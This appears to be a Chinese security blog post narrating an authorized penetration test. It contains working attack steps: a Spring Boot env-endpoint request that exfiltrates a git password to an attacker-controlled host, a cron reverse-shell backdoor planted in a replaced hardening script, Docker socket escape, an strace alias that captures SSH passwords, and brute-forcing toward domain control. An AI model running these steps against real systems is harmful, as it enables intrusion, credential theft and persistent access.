2020/7/27 ⼀次曲折的渗透测试之旅
⼀次曲折的渗透测试之旅
原创 队员编号008 酒仙桥六号部队 5⽉19⽇
这是 酒仙桥六号部队 的第 8 篇⽂章。
全⽂共计2241个字，预计阅读时⻓6分钟。
1
前⾔
记述⼀次"授权测试"、"授权测试"、"授权测试"中对某⽹站进⾏测试。
第⼀次渗透测试有点紧张，就把这次渗透测试遇到的⼀些问题，⼩技巧记录下来做个分
享和⼩结。
PS：渗透过程中的任何敏感信息均已做过脱敏处理。
2
突破
1、⾸先是对⽬标进⾏信息搜集，搜集⼀些⼦域名和端⼝。这⾥没有什么特殊的⼿法，就
是扫描。扫描到了⼀个spring boot的信息泄露。
⾸先尝试访问了下jolokia，trace，dump这些⾼危的endpoit，提示404 。很多接⼝
都都失效了，只有下⾯⼏个接⼝，env泄露⼀些信息。
1 /health
2 /env
https://mp.weixin.qq.com/s/HmGEYRcf1hSVw9Uu9XHGsA 1/14
2020/7/27 ⼀次曲折的渗透测试之旅
3 /info
2、然后试了下env配置⽂件进⾏xstream反序列化，如果Eureka-Client的版本⽐较
低的，可以有机会直接getshell。
使⽤flask返回application/xml格式数据：
1 from flask import Flask, Response
2
3 app = Flask(__name__)
4 @app.route('/', defaults={'path': ''})
5 @app.route('/', methods = ['GET', 'POST'])
6 def catch_all(path):
7 xml = """
8 
9 
11 
13 
14 
15 
16 
17 
18 
19 命令
20 
21 false
22 
23 
24 
25 
26 java.lang.ProcessBuilder
27 start
28 
29 
30 foo
31 
https://mp.weixin.qq.com/s/HmGEYRcf1hSVw9Uu9XHGsA 2/14
2020/7/27 ⼀次曲折的渗透测试之旅
32 foo
33 
34 
35 
36 
37 
38 
39 
40 
41 
42 
43 """
44 return Response(xml, mimetype='application/xml')
最后由于不知名原因，http请求没有获取到，猜测可能是以下⼏点原因之⼀：
a、版本较⾼
b、依赖包未安装
c、⽹络原因
3、由于是个测试站点，也没有找到什么敏感信息。准备换下⼀个⽹站再深⼊的时候，发
现env中有个打码的git password。
https://mp.weixin.qq.com/s/HmGEYRcf1hSVw9Uu9XHGsA 3/14
2020/7/27 ⼀次曲折的渗透测试之旅
4、通过set spring的
eureka.client.serviceUrl.defaultZone属性，读取打码的password。
将gitpass这个变量，赋值给
eureka.client.serviceUrl.defaultZone属性，然后刷新下应⽤，在他⾃动请求我们
的恶意地址的时候，便会将gitpass通过401认证的⽅式传输给我们的恶意地址。
1 POST /env HTTP/1.1
2 Host: 0.0.0.0(实际ip或host地址)
3 Accept-Encoding: gzip, deflate
4 Accept: */*
5 Accept-Language: en
6 User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x6
7 Connection: close
8 Content-Type: application/x-www-form-urlencoded
9 Content-Length: 81
10
11 eureka.client.serviceUrl.defaultZone=http://${gitPassword}@0.0.0.0:8080
5、refresh后，让app⾃动获取属性，这样可以把数据发送到我们的服务器上。
https://mp.weixin.qq.com/s/HmGEYRcf1hSVw9Uu9XHGsA 4/14
2020/7/27 ⼀次曲折的渗透测试之旅
6、解开base64，获取到git账户密码。
3
迂回
1、登录到他们git账户上，看看有没有什么敏感的配置⽂件。结果发现都是⼀些内⽹的
测试环境的数据配置⽂件，没有太⼤的⽤处。
https://mp.weixin.qq.com/s/HmGEYRcf1hSVw9Uu9XHGsA 5/14
2020/7/27 ⼀次曲折的渗透测试之旅
2、紧接着去看代码能不能审计出⼀些漏洞。但由于是测试账号，可⻅项⽬不多。
3、再翻到⼏个有低版本的bugjson，但是外⽹找不到对应的⽹站。
4、发现⼀个oss的链接，oss服务下的⼀级域名存在通⽤的编辑器漏洞，可以直接
getshell，这⾥就不再赘述了。主要是这个oss链接，是个加固linux的脚本。
5、下载下来打开看了下，猜测应该是个通⽤运维部署新的机器的时候的常⽤脚本。可以
通过迂回渗透他的oss服务，通过broken link hijacking 获取他内⽹⼀些能出⽹的服
务器的权限。
https://mp.weixin.qq.com/s/HmGEYRcf1hSVw9Uu9XHGsA 6/14
2020/7/27 ⼀次曲折的渗透测试之旅
6、前⾯发现已经拿下oss服务商的部分权限，查看他的配置⽂件，发现⼀台内⽹主机的
sa权限的数据库，连接之后执⾏xp_cmdshell系统命令。
7、然后发现他们很多c段的ip都来请求这个机器的1433数据库，这个数据库应该是个主
数据库。
https://mp.weixin.qq.com/s/HmGEYRcf1hSVw9Uu9XHGsA 7/14
2020/7/27 ⼀次曲折的渗透测试之旅
8、连上mssql数据库，翻了很久找到了⽬标的oss上传使⽤的key。然后上传替换了这
个linux加固脚本，并在⾥⾯添加了计划任务后⻔。
1 echo -e "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/IP/PORT 0>&1\n\n" >> /v
4
逃逸
1、⼀段时间之后，发现获取了⼀台linux的shell。ifconfig发现存在docker⽹卡，所
以这是⼀台docker容器。
2、⼀般来说docker逃逸，会使⽤下⾯⼏种⽅法：
a、emote api 未授权访问
https://mp.weixin.qq.com/s/HmGEYRcf1hSVw9Uu9XHGsA 8/14
2020/7/27 ⼀次曲折的渗透测试之旅
b、docker.sock挂载到容器内部
c、特权模式
d、runc（CVE-2019-5736）
e、Dirty Cow（CVE-2016-5195）
3、尝试扫了下2375端⼝，没有发现未授权的端⼝访问。
4、find / -name docker.sock尝试寻找下挂载的sock⽂件。
发现了在/var/run⽬录下的sock⽂件, docker.sock是Docker deamon监听的Unix
socket，能与其通信意味着可以管理docker。
1 curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json
5、当容器访问docker socket时，我们可通过与docker daemon的通信对其进⾏恶
意操纵完成逃逸。
若容器A可以访问docker socket，我们便可在其内部安装client（docker），通过
docker.sock与宿主机的server（docker daemon）进⾏交互，运⾏并切换⾄不安全
的 容 器 B ， 最 终 在 容 器 B 中 控 制 宿 主 机 。 以 读 写 权 限 挂 载 系 统 核 ⼼ ⽬ 录 (/root,
/var/spool/cron/等)到容器，可以获取到宿主机的权限。
https://mp.weixin.qq.com/s/HmGEYRcf1hSVw9Uu9XHGsA 9/14
2020/7/27 ⼀次曲折的渗透测试之旅
5
内⽹
1、通过执⾏计划任务，执⾏了反弹shell命令，控制了宿主机。查看下宿主机中的
.bash_history⽂件，发现经常使⽤这台服务器登录其他服务器。
通过留ssh后⻔抓取运维常⽤密码。
2、通过ssh后⻔，抓运维密码。
1 alias ssh='strace -o /tmp/sssh.log -e read,write,connect -s2048 ssh'
https://mp.weixin.qq.com/s/HmGEYRcf1hSVw9Uu9XHGsA 10/14
2020/7/27 ⼀次曲折的渗透测试之旅
3、获取到运维密码的规律 A+⽤户名+@+年份，⽣成密码列表，爆破3389获取到⼀台
服务器。
https://mp.weixin.qq.com/s/HmGEYRcf1hSVw9Uu9XHGsA 11/14
2020/7/27 ⼀次曲折的渗透测试之旅
4、然后就是常规操作，读取密码hash，横向渗透，最终获取域控权限。
5、在内⽹使⽤密码、⽤户名，可以登录⼤部分内⽹⽹站。⾄此内⽹沦陷。
https://mp.weixin.qq.com/s/HmGEYRcf1hSVw9Uu9XHGsA 12/14
2020/7/27 ⼀次曲折的渗透测试之旅
6
⼩结
根据spring框架泄露git账号信息，登录到外⽹git账户中。由关闭了部分接⼝，可知做
过部分安全措施。然⽽并没有深⼊了解这个漏洞。
后⾯利⽤blh漏洞getshell获取到内⽹的权限，最终通过容器逃逸获取服务器权限。容
器安全很多⼚商还是不够重视，忽略了纵深防御。过分依赖容器、虚拟化本身的安全机
https://mp.weixin.qq.com/s/HmGEYRcf1hSVw9Uu9XHGsA 13/14
2020/7/27 ⼀次曲折的渗透测试之旅
制。
https://mp.weixin.qq.com/s/HmGEYRcf1hSVw9Uu9XHGsA 14/14